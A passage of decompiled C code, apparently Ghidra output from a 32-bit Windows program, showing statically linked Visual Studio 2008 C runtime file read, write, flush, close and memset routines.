          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)local_10 + 3);
            local_14 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_0040c031;
          }
          goto LAB_0040c026;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_14 = (short *)((int)local_14 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_0040c031;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*local_10 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_14 = (short *)((int)local_14 + (int)local_10);
          _MaxCharCount = (uint)local_10;
          psVar8 = local_10;
          if (local_10 < local_14) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar8 = *(short *)_MaxCharCount;
                  psVar8 = psVar8 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_14 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_0040c0d4;
                  }
LAB_0040c167:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_0040c169:
                  *psVar8 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_0040c167;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar8 == local_10) && (local_c == 10)) goto LAB_0040c0d4;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_0040c16f;
                    goto LAB_0040c167;
                  }
                  if (local_c == 10) {
LAB_0040c0d4:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_0040c169;
                  }
                  *psVar8 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar8 = sVar17;
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_0040c16f:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_14);
          }
          local_14 = (short *)((int)psVar8 - (int)local_10);
          goto LAB_0040c031;
        }
        if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_14 = (short *)((int)local_14 + (int)local_10);
        _MaxCharCount = (uint)local_10;
        psVar8 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_0040beb1;
                }
LAB_0040bf28:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar8 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_0040bf28;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_0040beb1;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_0040bf2c;
                  goto LAB_0040bf28;
                }
                if (local_5 == '\n') {
LAB_0040beb1:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar8 = 10;
                }
                else {
                  *(undefined *)psVar8 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar8 = cVar4;
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_0040bf2c:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_14);
        }
        local_14 = (short *)((int)psVar8 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_0040c031;
        bVar3 = *(byte *)(short *)((int)psVar8 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar8 = (short *)((int)psVar8 + -1);
          while ((((&DAT_00422438)[bVar3] == '\0' && (iVar13 < 5)) && (local_10 <= psVar8))) {
            psVar8 = (short *)((int)psVar8 + -1);
            bVar3 = *(byte *)psVar8;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_00422438)[*(byte *)psVar8] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_0040c02d;
          }
          if ((char)(&DAT_00422438)[*(byte *)psVar8] + 1 == iVar13) {
            psVar8 = (short *)((int)psVar8 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar12 = (short *)((int)psVar8 + 1);
            *(byte *)(*piVar6 + iVar14 + 5) = *(byte *)psVar8;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar12;
              psVar12 = psVar8 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar12;
              psVar12 = (short *)((int)psVar12 + 1);
            }
            psVar8 = (short *)((int)psVar12 - iVar13);
          }
        }
        iVar13 = (int)psVar8 - (int)local_10;
        local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_14 != (short *)0x0) {
          bVar15 = local_14 != (short *)iVar13;
          local_14 = (short *)((int)local_14 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_0040c031;
        }
        uVar11 = GetLastError();
LAB_0040c026:
        __dosmaperr(uVar11);
      }
LAB_0040c02d:
      local_18 = -1;
LAB_0040c031:
      if (local_10 != (short *)_DstBuf) {
        _free(local_10);
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_0040bd12:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_0040bd24:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2008 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00424fd8)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_0040c2cf();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_0040c22b;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0040c22b:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



void FUN_0040c2cf(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2008 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    iVar2 = _File->_file;
  }
  return iVar2;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_00424fd4 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_00424fe0 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_00424fe0 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_0040c3f0;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0040c3f2;
    }
  }
LAB_0040c3f0:
  DVar4 = 0;
LAB_0040c3f2:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2008 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00424fd8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_0040c4e9();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0040c4e9(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2008 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_00426120; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_00425110 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_00425110 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040c676();
    }
  }
  FUN_0040c6a5();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_0040c676(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_00425110 + unaff_ESI * 4));
  return;
}



void FUN_0040c6a5(void)

{
  FUN_0040e64c(1);
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040c6dd:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_0040c6dd;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_0040b204(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_0040b204(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_00422d78;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_00424fe0)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_0040c805;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_0040c805:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR WVar1;
  wint_t wVar2;
  ulong *puVar3;
  int *piVar4;
  int iVar5;
  _ptiddata p_Var6;
  BOOL BVar7;
  DWORD nNumberOfBytesToWrite;
  int iVar8;
  uint uVar9;
  char cVar10;
  WCHAR *pWVar11;
  char *pcVar12;
  int unaff_EDI;
  WCHAR *pWVar13;
  ushort uVar14;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  char *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  char *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = (char *)0x0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0040cf41;
  if (_Buf == (void *)0x0) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0040cf41;
  }
  piVar4 = &DAT_00424fe0 + (_FileHandle >> 5);
  iVar8 = (_FileHandle & 0x1fU) * 0x40;
  cVar10 = (char)(*(char *)(*piVar4 + iVar8 + 0x24) * '\x02') >> 1;
  local_1add = cVar10;
  local_1adc = piVar4;
  if (((cVar10 == '\x02') || (cVar10 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0040cf41;
  }
  if ((*(byte *)(*piVar4 + iVar8 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar5 = __isatty(_FileHandle);
  if ((iVar5 == 0) || ((*(byte *)(iVar8 + 4 + *piVar4) & 0x80) == 0)) {
LAB_0040cbb2:
    if ((*(byte *)((HANDLE *)(*piVar4 + iVar8) + 1) & 0x80) == 0) {
      BVar7 = WriteFile(*(HANDLE *)(*piVar4 + iVar8),local_1ad0,_MaxCharCount,(LPDWORD)&local_1ad8,
                        (LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_0040ceb2:
        local_1ac4 = GetLastError();
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
      }
LAB_0040cebe:
      if (local_1acc != (char *)0x0) goto LAB_0040cf41;
      goto LAB_0040cec7;
    }
    local_1ac4 = 0;
    if (cVar10 == '\0') {
      local_1ac8 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_0040cf03;
      do {
        local_1ac0 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac8 - (int)local_1ad0;
        pWVar11 = local_1abc;
        do {
          if (_MaxCharCount <= uVar9) break;
          pWVar13 = (WCHAR *)((int)local_1ac8 + 1);
          cVar10 = *(char *)local_1ac8;
          uVar9 = uVar9 + 1;
          if (cVar10 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar11 = '\r';
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar11 = cVar10;
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar13;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_0040ceb2;
        local_1acc = local_1acc + (int)local_1ad8;
      } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar4 = local_1adc, (uint)((int)local_1ac8 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_0040cebe;
    }
    local_1ac0 = local_1ad0;
    if (cVar10 == '\x02') {
      if (_MaxCharCount != 0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          uVar9 = (int)local_1ac0 - (int)local_1ad0;
          pWVar11 = local_1abc;
          do {
            if (_MaxCharCount <= uVar9) break;
            pWVar13 = local_1ac0 + 1;
            WVar1 = *local_1ac0;
            uVar9 = uVar9 + 2;
            if (WVar1 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar11 = L'\r';
              pWVar11 = pWVar11 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar11 = WVar1;
            pWVar11 = pWVar11 + 1;
            local_1ac0 = pWVar13;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_0040ceb2;
          local_1acc = local_1acc + (int)local_1ad8;
        } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar4 = local_1adc, (uint)((int)local_1ac0 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_0040cebe;
      }
    }
    else if (_MaxCharCount != 0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac0 - (int)local_1ad0;
        pWVar11 = local_6bc;
        do {
          if (_MaxCharCount <= uVar9) break;
          WVar1 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          uVar9 = uVar9 + 2;
          if (WVar1 == L'\n') {
            *pWVar11 = L'\r';
            pWVar11 = pWVar11 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar11 = WVar1;
          pWVar11 = pWVar11 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar12 = (char *)0x0;
        iVar5 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar11 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar5 == 0) goto LAB_0040ceb2;
        do {
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *local_1adc),local_1414 + (int)pcVar12,
                            iVar5 - (int)pcVar12,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) {
            local_1ac4 = GetLastError();
            break;
          }
          pcVar12 = pcVar12 + (int)local_1ad8;
        } while ((int)pcVar12 < iVar5);
      } while ((iVar5 <= (int)pcVar12) &&
              (local_1acc = (char *)((int)local_1ac0 - (int)local_1ad0), local_1acc < _MaxCharCount)
              );
      goto LAB_0040cebe;
    }
  }
  else {
    p_Var6 = __getptd();
    local_1ae4 = (uint)(p_Var6->ptlocinfo->lc_category[0].wlocale == (wchar_t *)0x0);
    BVar7 = GetConsoleMode(*(HANDLE *)(iVar8 + *piVar4),&local_1ae8);
    if ((BVar7 == 0) || ((local_1ae4 != 0 && (cVar10 == '\0')))) goto LAB_0040cbb2;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac0 = (WCHAR *)0x0;
      pWVar11 = local_1ad0;
      do {
        piVar4 = local_1adc;
        if (local_1add == '\0') {
          cVar10 = *(char *)pWVar11;
          local_1ae4 = (uint)(cVar10 == '\n');
          iVar5 = *local_1adc + iVar8;
          if (*(int *)(iVar5 + 0x38) == 0) {
            iVar5 = _isleadbyte(CONCAT22(cVar10 >> 7,(short)cVar10));
            if (iVar5 == 0) {
              uVar14 = 1;
              pWVar13 = pWVar11;
              goto LAB_0040ca19;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar11)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar8 + 0x34 + *piVar4) = *(undefined *)pWVar11;
              *(undefined4 *)(iVar8 + 0x38 + *piVar4) = 1;
              break;
            }
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar11,2);
            if (iVar5 == -1) break;
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar5 + 0x34);
            *(undefined4 *)(iVar5 + 0x38) = 0;
            uVar14 = 2;
            pWVar13 = &local_10;
            local_10._1_1_ = cVar10;
LAB_0040ca19:
            iVar5 = _mbtowc((wchar_t *)&local_1ac4,(char *)pWVar13,(uint)uVar14);
            if (iVar5 == -1) break;
          }
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          nNumberOfBytesToWrite =
